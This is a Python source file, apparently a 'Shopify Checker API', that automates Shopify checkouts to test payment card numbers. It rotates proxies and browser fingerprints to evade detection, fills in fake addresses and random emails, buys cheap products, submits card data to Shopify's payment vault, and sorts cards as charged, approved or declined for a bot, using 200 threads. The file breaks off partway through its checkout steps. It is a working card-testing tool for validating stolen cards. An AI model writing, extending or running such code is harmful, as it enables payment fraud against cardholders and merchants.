"""
Shopify Checker API — All-in-One (v3.0.0)
==========================================
Combines the best of api_server.py + checkout_engine.py + main.py:

  ✅ Strict charge verification (5 checks — no fake CHARGED)
  ✅ 200-thread pool for high concurrency
  ✅ Fixed actions JS regex (handles new Shopify CDN patterns)
  ✅ Bot-compatible field names: Gateway, Response, Charged, CC, Price, Site,
     status_code, error, retryable, receipt_url
  ✅ Multi-country shipping fallback
  ✅ Digital-goods support
  ✅ Same-file deploy — no cross-imports

Endpoints
---------
GET  /health
GET  /check?url=<shop>&card=NUM|MM|YYYY|CVV&proxy=USER:PASS@HOST:PORT
POST /check   {"card":"...","shop_url":"...","proxy":"...","low":true}

Response
--------
{
  "Response":    "CHARGED | APPROVED | DECLINED | ERROR",
  "Charged":     "True | False",
  "CC":          "NUM|MM|YYYY|CVV",
  "Price":       "9.99",
  "Gateway":     "Shopify",
  "Site":        "https://...",
  "status_code": "ORDER_PLACED | CARD_DECLINED | ...",
  "error":       "",
  "retryable":   false,
  "receipt_url": "https://.../orders/12345"
}

CHARGED is returned ONLY when Shopify confirms a real order with proof.
"""

import os, json, re, time, html, random, urllib.parse, logging, asyncio
import concurrent.futures, functools, threading
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
from datetime import datetime, timezone

from curl_cffi.requests import Session
from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

# ─────────────────────────── logging ────────────────────────────────────
logging.basicConfig(
    level=os.environ.get("LOG_LEVEL", "WARNING"),
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("shopify")

# ─────────────────────────── config ─────────────────────────────────────
THREADS = int(os.environ.get("CHECKER_THREADS", "200"))
RETRIES = int(os.environ.get("CHECKER_RETRIES", "1"))

BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "chrome107", "edge101", "safari15_5", "safari17_0"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

# ─────────────────────────── regexes ────────────────────────────────────
_R = {
    "session":      re.compile(r'name="serialized-sessionToken"\s+content="([^"]*)"'),
    "source":       re.compile(r'name="serialized-sourceToken"\s+content="([^"]*)"'),
    "stable":       re.compile(r'"stableId"\s*:\s*"([0-9a-f\-]{36})"'),
    "commit":       re.compile(r'"commitSha"\s*:\s*"([a-f0-9]{40})"'),
    "checkout_tk":  re.compile(r'/checkouts/cn/([^/?]+)'),
    "pat_id":       re.compile(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"'),
    "actions":      re.compile(
        r'(?:'
        r'/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_\-/]*\.[A-Za-z0-9_\-]+\.js'
        r'|/cdn/shopifycloud/checkout-web/assets/c1/[a-z]{2}/actions[A-Za-z0-9_\-/]*\.[A-Za-z0-9_\-]+\.js'
        r'|/cdn/shopifycloud/checkout-web/assets/[a-z0-9_\-]+/actions[A-Za-z0-9_\-/]*\.[A-Za-z0-9_\-]+\.js'
        r'|/cdn/shopifycloud/checkout-web/assets/actions[A-Za-z0-9_\-/]*\.[A-Za-z0-9_\-]+\.js'
        r'|https://cdn\.shopify\.com/shopifycloud/checkout-web/assets/[^"\']+\.js'
        r')'
    ),
    "proposal_id":  re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"'),
    "submit_id":    re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"'),
    "poll_id":      re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"'),
    "ident_sig":    re.compile(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"'),
    "vault_url":    re.compile(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)'),
    "vault_dom":    re.compile(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"'),
    "queue":        re.compile(r'"queueToken"\s*:\s*"([^"]+)"'),
    "receipt_id":   re.compile(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"'),
    "receipt_ses":  re.compile(r'"sessionToken"\s*:\s*"([^"]+)"'),
    "pci_id":       re.compile(r'"id"\s*:\s*"([^"]+)"'),
    "poll_delay":   re.compile(r'"pollDelay"\s*:\s*(\d+)'),
    "receipt_ty":   re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"'),
    "err_code":     re.compile(r'"code"\s*:\s*"([^"]+)"'),
    "err_nonloc":   re.compile(r'"nonLocalizedMessage"\s*:\s*"([^"]+)"'),
    "err_loc":      re.compile(r'"localizedMessage"\s*:\s*"([^"]+)"'),
    "err_msg":      re.compile(r'"message"\s*:\s*"([^"]+)"'),
    "order_conf_url":   re.compile(r'"confirmationPage"\s*:\s*\{[^}]*?"url"\s*:\s*"([^"]+)"'),
    "order_status_url": re.compile(r'"orderStatusPageUrl"\s*:\s*"([^"]+)"'),
}

# ─────────────────────────── models ─────────────────────────────────────
class CheckStatus(Enum):
    CHARGED, APPROVED, DECLINED, ERROR = range(4)


@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = "USD"
    shop_url: str = ""
    receipt_url: str = ""
    error: str = ""
    retryable: bool = False


@dataclass
class Address:
    first: str; last: str; a1: str; a2: str; city: str
    country: str; zone: str; postal: str; phone: str


ADDR: Dict[str, Address] = {
    "US": Address("James", "Anderson", "428 W 45th St", "Apt 4B", "New York", "US", "NY", "10036", "+12125550100"),
    "CA": Address("John", "Smith", "200 Kent St", "", "Ottawa", "CA", "ON", "K1A0G9", "+16135550100"),
    "GB": Address("James", "Wilson", "10 Downing St", "", "London", "GB", "ENG", "SW1A2AA", "+442012345678"),
    "AU": Address("Thomas", "Taylor", "1 George St", "", "Sydney", "AU", "NSW", "2000", "+61212345678"),
    "DE": Address("Lucas", "Thomas", "Friedrichstr 100", "", "Berlin", "DE", "BE", "10117", "+493012345678"),
    "FR": Address("Hugo", "Bernard", "10 Rue de Rivoli", "", "Paris", "FR", "IDF", "75001", "+33112345678"),
    "NL": Address("Bas", "Jansen", "Dam 1", "", "Amsterdam", "NL", "NH", "1012JS", "+31201234567"),
    "IE": Address("Sean", "Murphy", "1 Grafton St", "", "Dublin", "IE", "D", "D02Y006", "+35311234567"),
    "SE": Address("Erik", "Andersson", "Vasagatan 1", "", "Stockholm", "SE", "AB", "11120", "+468123456"),
    "NO": Address("Olav", "Hansen", "Karl Johans gate 1", "", "Oslo", "NO", "03", "0154", "+4721234567"),
    "DK": Address("Lars", "Nielsen", "Strøget 1", "", "Copenhagen", "DK", "84", "1457", "+4531234567"),
}
FALLBACK_ORDER = ["CA", "GB", "AU", "DE", "FR", "NL", "IE", "SE", "NO", "DK"]
FIRST_N = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
LAST_N = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]


def pick_addr(country: str) -> Address:
    return ADDR.get(country) or ADDR.get(country[:2]) or ADDR["US"]


def fallback_addrs(exclude: str) -> List[Address]:
    return [ADDR[c] for c in FALLBACK_ORDER if c.upper() != exclude.upper() and c in ADDR]


def rand_email() -> str:
    return f"{random.choice(FIRST_N)}{random.choice(LAST_N)}{random.randint(1,999)}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}".lower()


# ─────────────────────────── proxy normalizer ───────────────────────────
def normalize_proxy(raw: str) -> str:
    """Convert host:port:user:pass → http://user:pass@host:port"""
    if not raw:
        return ""
    p = raw.strip()
    if "://" in p:
        return p
    parts = p.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    if len(parts) == 2:
        return f"http://{p}"
    return p


# ─────────────────────────── TLS client ─────────────────────────────────
class TLS:
    def __init__(self, proxy: str = "", timeout: int = 20):
        profile = random.choice(BROWSER_PROFILES)
        ua = random.choice(USER_AGENTS)
        kw = {"impersonate": profile, "timeout": timeout}
        if proxy:
            kw["proxy"] = proxy
        self.s = Session(**kw)
        self.s.headers.update({
            "User-Agent": ua,
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        })
        self.ua = ua
        self.profile = profile

    def get(self, u, **k):
        k.setdefault("timeout", 20)
        return self.s.get(u, **k)

    def post(self, u, **k):
        k.setdefault("timeout", 20)
        return self.s.post(u, **k)

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


def _g(rx: str, s: str, default: str = "") -> str:
    m = _R[rx].search(s)
    return m.group(1) if m else default


# ─────────────────────────── Step 0: product ────────────────────────────
def find_product(client: TLS, shop: str, max_price: float = 5.0) -> Tuple[str, str, str]:
    r = client.get(f"{shop}/products.json?limit=250")
    if r.status_code != 200:
        raise Exception(f"products.json HTTP {r.status_code}")
    products = r.json().get("products", [])
    if not products:
        raise Exception("no products")

    in_range, fallback = [], []
    for p in products:
        for v in p.get("variants", []):
            if v.get("available") is False:
                continue
            if v.get("inventory_quantity") is not None and v["inventory_quantity"] <= 0:
                continue
            try:
                price = float(v.get("price") or 0)
            except Exception:
                continue
            if price < 0.50:
                continue
            e = {"variant_id": str(v["id"]), "price": v.get("price", "0.00"), "title": p.get("title", "")}
            (in_range if price <= max_price else fallback).append(e)

    if not in_range and not fallback:
        raise Exception("no available products")
    pool = in_range or sorted(fallback, key=lambda x: float(x["price"]))
    pick = random.choice(pool)
    return pick["variant_id"], pick["price"], pick["title"]


# ─────────────────────────── Step 1: cart → checkout ────────────────────
def cart_to_checkout(client: TLS, shop: str, variant: str) -> Tuple[str, str, str, str]:
    r = client.get(f"{shop}/cart/{variant}:1", allow_redirects=True, headers={
        "Referer": shop + "/",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
    })
    if r.status_code not in (200, 302):
        raise Exception(f"cart HTTP {r.status_code}")
    url = r.url
    body = r.text
    ck_tok = _g("checkout_tk", url)
    m = _R["session"].search(body)
    ses_tok = html.unescape(m.group(1)).strip('"') if m else ""
    return url, ck_tok, ses_tok, body


# ─────────────────────────── Step 2: PAT ────────────────────────────────
def fetch_pat(client: TLS, shop: str, checkout_url: str, pat_id: str) -> None:
    u = f"{shop}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    client.get(u, headers={"Referer": checkout_url, "Accept": "*/*"})


# ─────────────────────────── Step 3: actions JS ─────────────────────────
def fetch_ids(client: TLS, shop: str, checkout_html: str) -> Tuple[str, str, str]:
    url = _g("actions", checkout_html)
    if not url:
        # Fallback: broader search
        for pattern in [
            r'(/cdn/shopifycloud/checkout-web/assets/[^"\']+\.js)',
            r'(https://cdn\.shopify\.com/shopifycloud/checkout-web/assets/[^"\']+\.js)',
        ]:
            m = re.search(pattern, checkout_html)
            if m:
                url = m.group(1)
                break
    if not url:
        raise Exception("no actions js")

    full_url = url if url.startswith(("http://", "https://")) else shop + url
    r = client.get(full_url, headers={"Referer": shop + "/"})
    if r.status_code != 200:
        raise Exception(f"actions js HTTP {r.status_code}")

    js = r.text
    prop = _g("proposal_id", js)
    subm = _g("submit_id", js)
    poll = _g("poll_id", js) or "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
    if not prop or not subm:
        raise Exception(f"missing ids (prop={bool(prop)} subm={bool(subm)})")
    return prop, subm, poll


# ─────────────────────────── headers ────────────────────────────────────
def _hdr(shop: str, ref: str, ck_tok: str, ses_tok: str, build: str, src: str) -> Dict:
    return {
        "Accept": "application/json",
        "Accept-Language": "en-US",
        "Content-Type": "application/json",
        "Origin": shop,
        "Referer": ref,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": USER_AGENTS[0],
        "Shopify-Checkout-Client": "checkout-web/1.0",
        "Shopify-Checkout-Source": f'id="{ck_tok}", type="cn"',
        "X-Checkout-One-Session-Token": ses_tok,
        "X-Checkout-Web-Build-Id": build,
        "X-Checkout-Web-Deploy-Stage": "production",
        "X-Checkout-Web-Server-Handling": "fast",
        "X-Checkout-Web-Server-Rendering": "yes",
        "X-Checkout-Web-Source-Id": src,
    }


def _proposal_body(ses: str, stable: str, variant: str, queue: Optional[str],
                   email: Optional[str], addr: Optional[Address],
                   currency: str, country: str) -> str:
    if addr:
        partial = {
            "address1": addr.a1, "address2": addr.a2, "city": addr.city,
            "countryCode": addr.country, "postalCode": addr.postal,
            "firstName": addr.first, "lastName": addr.last,
            "zoneCode": addr.zone, "phone": addr.phone, "oneTimeUse": False,
        }
        billing = {
            "address1": addr.a1, "address2": addr.a2, "city": addr.city,
            "countryCode": addr.country, "postalCode": addr.postal,
            "firstName": addr.first, "lastName": addr.last,
            "zoneCode": addr.zone, "phone": addr.phone,
        }
    else:
        partial = {"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": "", "oneTimeUse": False}
        billing = {"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}

    buyer: Dict = {
        "customer": {"presentmentCurrency": currency, "countryCode": country},
        "phoneCountryCode": country,
        "marketingConsent": [],
        "shopPayOptInPhone": {"countryCode": country},
        "rememberMe": False,
    }
    if email:
        buyer["email"] = email
        buyer["emailChanged"] = (addr is None)

    payload = {
        "variables": {
            "sessionInput": {"sessionToken": ses},
            "queueToken": queue,
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": {"partialStreetAddress": partial},
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True},
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True,
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True,
            },
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": stable,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{variant}",
                            "variantId": f"gid://shopify/ProductVariant/{variant}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                        },
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponentsSource": None,
                    "lineComponents": [],
                }],
            },
            "memberships": {"memberships": []},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing},
            },
            "buyerIdentity": buyer,
            "tip": {"tipLines": []},
            "poNumber": None,
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"any": True},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": [],
            },
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None, "signatureUuid": None,
                "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
        },
        "operationName": "Proposal",
    }
    return json.dumps(payload, separators=(",", ":"))


def send_proposal(client: TLS, shop: str, ref: str, ck_tok: str, ses_tok: str,
                  build: str, src: str, prop_id: str, body: str) -> str:
    r = client.post(
        f"{shop}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=body, headers=_hdr(shop, ref, ck_tok, ses_tok, build, src))
    return r.text


# ─────────────────────────── Step 9: PCI vault ──────────────────────────
def vault_card(ident_sig: str, card_num: str, card_name: str, mes: int, ano: int,
               cvv: str, scope: str, vault_url: str, proxy: str, profile: str) -> str:
    endpoint = vault_url or "https://checkout.pci.shopifyinc.com/sessions"
    origin = endpoint.rsplit("/sessions", 1)[0] if "/sessions" in endpoint else "https://checkout.pci.shopifyinc.com"
    payload = json.dumps({
        "credit_card": {
            "number": card_num, "month": mes, "year": ano,
            "verification_value": cvv, "start_month": None, "start_year": None,
            "issue_number": "", "name": card_name,
        },
        "payment_session_scope": scope,
    })
    headers = {
        "Accept": "application/json", "Content-Type": "application/json",
        "Origin": origin, "Referer": f"{origin}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
        "Shopify-Identification-Signature": ident_sig,
        "User-Agent": USER_AGENTS[0],
    }
    kw = {"data": payload, "headers": headers, "timeout": 20}
    if proxy:
        kw["proxy"] = proxy
    with Session(impersonate=profile) as s:
        r = s.post(endpoint, **kw)
    m = _R["pci_id"].search(r.text)
    return m.group(1) if m else ""


# ─────────────────────────── Step 10: submit ────────────────────────────
def submit_payment(client: TLS, shop: str, ref: str, ck_tok: str, ses_tok: str,
                   build: str, src: str, submit_id: str, stable: str, variant: str,
                   queue: str, email: str, addr: Address, currency: str, country: str,
                   pci_id: str, total: str, shipping: str, handle: str,
                   signed_handles: List[str], tax: str, attempt: str) -> str:
    delivery_lines = [{
        "destination": {"streetAddress": {
            "address1": addr.a1, "address2": addr.a2, "city": addr.city,
            "countryCode": addr.country, "postalCode": addr.postal,
            "firstName": addr.first, "lastName": addr.last,
            "zoneCode": addr.zone, "phone": addr.phone, "oneTimeUse": False,
        }},
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {"handle": handle, "customDeliveryRate": False},
            "options": {},
        },
        "targetMerchandiseLines": {"lines": [{"stableId": stable}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {"any": True},
        "destinationChanged": False,
    }]
    de_lines = [{"signedHandle": h} for h in signed_handles]

    payload = {
        "variables": {
            "input": {
                "sessionInput": {"sessionToken": ses_tok},
                "queueToken": queue,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": delivery_lines,
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                },
                "deliveryExpectations": {"deliveryExpectationLines": de_lines},
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stable,
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{variant}",
                            "variantId": f"gid://shopify/ProductVariant/{variant}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                        }},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": [],
                    }],
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"value": {"amount": total, "currencyCode": "USD"}},
                    "paymentLines": [{
                        "paymentMethod": {"directPaymentMethod": {
                            "sessionId": pci_id,
                            "billingAddress": {"streetAddress": {
                                "address1": addr.a1, "address2": addr.a2, "city": addr.city,
                                "countryCode": addr.country, "postalCode": addr.postal,
                                "firstName": addr.first, "lastName": addr.last,
                                "zoneCode": addr.zone, "phone": addr.phone,
                            }},
                            "cardSource": None,
                        }},
                        "amount": {"value": {"amount": total, "currencyCode": "USD"}},
                    }],
                    "billingAddress": {"streetAddress": {
                        "address1": addr.a1, "address2": addr.a2, "city": addr.city,
                        "countryCode": addr.country, "postalCode": addr.postal,
                        "firstName": addr.first, "lastName": addr.last,
                        "zoneCode": addr.zone, "phone": addr.phone,
                    }},
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency, "countryCode": country},
                    "email": email, "emailChanged": False,
                    "phoneCountryCode": country,
                    "marketingConsent": [],
                    "shopPayOptInPhone": {"countryCode": country},
                    "rememberMe": False,
                },
                "tip": {"tipLines": []},
                "poNumber": None,
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {"amount": tax, "currencyCode": "USD"}},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": [],
                },
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None, "signatureUuid": None,
                    "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "cartMetafields": [],
            },
            "attemptToken": attempt,
            "metafields": [],
            "analytics": {"requestUrl": ref, "pageId": f"{random.getrandbits(64):016x}"},
        },
        "operationName": "SubmitForCompletion",
        "id": submit_id,
    }
    body = json.dumps(payload, separators=(",", ":"))
    r = client.post(
        f"{shop}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=body, headers=_hdr(shop, ref, ck_tok, ses_tok, build, src))
    return r.text


# ─────────────────────────── Step 11: poll ──────────────────────────────
def poll_receipt(client: TLS, shop: str, ref: str, ck_tok: str, ses_tok: str,
                 build: str, src: str, poll_id: str, receipt_id: str,
                 receipt_session: str) -> str:
    params = urllib.parse.urlencode({
        "operationName": "PollForReceipt",
        "variables": json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session}),
        "id": poll_id,
    })
    h = _hdr(shop, ref, ck_tok, ses_tok, build, src)
    h["X-Checkout-Web-Source-Id"] = ck_tok
    r = client.get(f"{shop}/checkouts/internal/graphql/persisted?{params}", headers=h)
    return r.text


# ─────────────────────────── seller extractor ───────────────────────────
def _seller(body: str) -> Dict:
    try:
        return (json.loads(body).get("data", {})
                              .get("session", {})
                              .get("negotiate", {})
                              .get("result", {})
                              .get("sellerProposal", {}))
    except Exception:
        return {}


def extract_delivery_handle_json(body: str) -> str:
    s = _seller(body)
    d = s.get("delivery", {})
    h = d.get("selectedDeliveryStrategy", {}).get("handle")
    if h:
        return h
    h = d.get("deliveryStrategyHandle")
    if h:
        return h
    for ln in d.get("deliveryLines", []):
        for mac in ln.get("deliveryMacros", []):
            hs = mac.get("deliveryStrategyHandles", [])
            if hs:
                return hs[0]
    return ""


def extract_signed_handles(body: str) -> List[str]:
    s = _seller(body)
    de = s.get("deliveryExpectations", {})
    tn = de.get("__typename", "")
    if tn == "FilledDeliveryExpectationTerms":
        return [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]
    if tn == "FilledDeliveryTerms":
        return []
    if isinstance(de.get("deliveryExpectations"), list):
        return [x.get("signedHandle") for x in de["deliveryExpectations"] if x.get("signedHandle")]
    return []


def extract_shipping(body: str) -> str:
    try:
        s = _seller(body)
        for ln in s.get("delivery", {}).get("deliveryLines", []):
            for st in ln.get("availableDeliveryStrategies", []):
                amt = st.get("amount", {}).get("value", {}).get("amount")
                if amt:
                    return str(amt)
    except Exception:
        pass
    m = re.search(r'"deliveryStrategyBreakdown".*?"amount".*?"amount"\s*:\s*"([^"]+)"', body, re.DOTALL)
    return m.group(1) if m else "0.00"


def extract_total(body: str) -> str:
    s = _seller(body)
    for k in ("checkoutTotal", "total", "runningTotal"):
        v = s.get(k, {}).get("value", {}).get("amount")
        if v:
            return str(v)
    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""


def extract_tax(body: str) -> str:
    try:
        return str(_seller(body).get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount", "0.00"))
    except Exception:
        return "0.00"


def extract_running_total(body: str) -> str:
    try:
        return str(_seller(body).get("runningTotal", {}).get("value", {}).get("amount", ""))
    except Exception:
        return ""


def is_digital_flow(body: str) -> bool:
    try:
        return _seller(body).get("isShippingRequired") is False
    except Exception:
        return False


# ─────────────────────────── error map ──────────────────────────────────
_ERR_MAP = {
    "do not honor": "DO_NOT_HONOR", "insufficient funds": "INSUFFICIENT_FUNDS",
    "card declined": "CARD_DECLINED", "invalid card": "CARD_INVALID",
    "expired card": "CARD_EXPIRED", "incorrect cvc": "CVV_INVALID",
    "stolen card": "CARD_STOLEN", "pickup card": "CARD_STOLEN",
    "throttled": "RATE_LIMITED", "rate limit": "RATE_LIMITED",
    "captcha": "CAPTCHA_REQUIRED", "risky": "RISK_REJECTED",
    "fraud": "RISK_REJECTED", "inventory": "OUT_OF_STOCK",
}


def map_err(raw: str) -> str:
    low = raw.lower()
    for k, v in _ERR_MAP.items():
        if k in low:
            return v
    return raw.upper().replace(" ", "_")[:40]


def any_error(body: str) -> str:
    for rx in ("err_nonloc", "err_loc", "err_code", "err_msg"):
        m = _R[rx].search(body)
        if m:
            return map_err(m.group(1))
    return ""


# ─────────────────────────── REAL-ORDER VERIFIER ────────────────────────
def is_real_charge(poll_body: str) -> Tuple[bool, str]:
    """
    STRICT verification — CHARGED only when ALL of these hold:
      1. purchaseOrder exists (not null)
      2. amount is non-zero
      3. A real /orders/ URL exists (confirmationPage.url OR orderStatusPageUrl)
      4. OR an Order GID is present (gid://shopify/Order/<digits>)

    A ProcessedReceipt/SuccessfulReceipt WITHOUT proof is NOT CHARGED.
    """
    try:
        data = json.loads(poll_body)
    except Exception:
        return False, ""

    receipt = (data.get("data") or {}).get("receipt") or {}
    if not receipt:
        return False, ""

    # Check 1: purchaseOrder must exist
    purchase_order = receipt.get("purchaseOrder")
    if not purchase_order:
        return False, ""

    # Check 2: amount must be non-zero
    total_paid = (
        ((purchase_order.get("totalAmountToPay") or {}).get("amount"))
        or ((purchase_order.get("checkoutTotal") or {}).get("amount"))
        or ""
    )
    if not total_paid or total_paid in ("0.00", "0"):
        return False, ""

    # Check 3: /orders/ URL
    conf_url = ""
    conf = receipt.get("confirmationPage") or {}
    if isinstance(conf, dict):
        conf_url = conf.get("url") or ""
    if conf_url and "/orders/" in conf_url:
        return True, conf_url

    osp = receipt.get("orderStatusPageUrl") or ""
    if osp and "/orders/" in osp:
        return True, osp

    # Check 4: Order GID
    order_obj = receipt.get("order") or {}
    order_gid = ""
    if isinstance(order_obj, dict):
        order_gid = order_obj.get("id") or ""
    if not order_gid:
        order_gid = receipt.get("orderId") or ""
    if isinstance(order_gid, str) and order_gid.startswith("gid://shopify/Order/"):
        return True, ""

    return False, ""


# ─────────────────────────── orchestrator ───────────────────────────────
def run_checkout(shop: str, card_entry: str, proxy: str = "", low: bool = True) -> CheckResult:
    cur, ctry = "USD", "US"
    result = CheckResult(card=card_entry, status=CheckStatus.ERROR, shop_url=shop, currency=cur)

    try:
        p = card_entry.strip().split("|")
        if len(p) != 4:
            raise ValueError("expected NUM|MM|YYYY|CVV")
        card_num, mes, ano, cvv = p[0], int(p[1]), int(p[2]), p[3]
    except Exception as e:
        result.error = str(e)
        return result

    now = datetime.now(timezone.utc)
    if ano < now.year or (ano == now.year and mes < now.month):
        result.status = CheckStatus.DECLINED
        result.status_code = "CARD_EXPIRED"
        result.error = "expired"
        return result

    email = rand_email()
    proxy = normalize_proxy(proxy)
    client = TLS(proxy=proxy)
    profile = client.profile

    try:
        # Step 0
        max_p = 5.0 if low else float("inf")
        try:
            variant, price, _ = find_product(client, shop, max_price=max_p)
        except Exception as e:
            result.retryable = True
            result.error = f"Step0: {e}"
            return result

        # Step 1
        try:
            ck_url, ck_tok, ses_tok, html_body = cart_to_checkout(client, shop, variant)
        except Exception as e:
            result.retryable = True
            result.error = f"Step1: {e}"
            return result

        stable = _g("stable", html.unescape(html_body))
        build = _g("commit", html.unescape(html_body))
        m = _R["source"].search(html_body)
        src = html.unescape(m.group(1)).strip('"') if m else ""
        pat = _g("pat_id", html.unescape(html_body))
        ident = _g("ident_sig", html_body.replace("&quot;", '"'))
        vault = _g("vault_url", html_body.replace("&quot;", '"'))
        vdom = _g("vault_dom", html_body.replace("&quot;", '"'))

        if not (stable and build and ses_tok):
            result.retryable = True
            result.error = "Step1: missing tokens"
            return result

        if pat:
            try:
                fetch_pat(client, shop, ck_url, pat)
            except Exception:
                pass

        # Step 3
        try:
            prop_id, submit_id, poll_id = fetch_ids(client, shop, html_body)
        except Exception as e:
            result.retryable = True
            result.error = f"Step3: {e}"
            return result
        finally:
            html_body = None

        # Step 4
        try:
            body = _proposal_body(ses_tok, stable, variant, None, None, None, cur, ctry)
            resp = send_proposal(client, shop, ck_url, ck_tok, ses_tok, build, src, prop_id, body)
            m_cur = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', resp)
            if m_cur:
                cur = m_cur.group(1)
            m_ctry = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', resp)
            if m_ctry:
                ctry = m_ctry.group(1)
            result.currency = cur
            qt = _g("queue", resp)
            if not qt:
                raise Exception("no queue")
        except Exception as e:
            result.retryable = True
            result.error = f"Step4: {e}"
            return result

        # Step 5
        try:
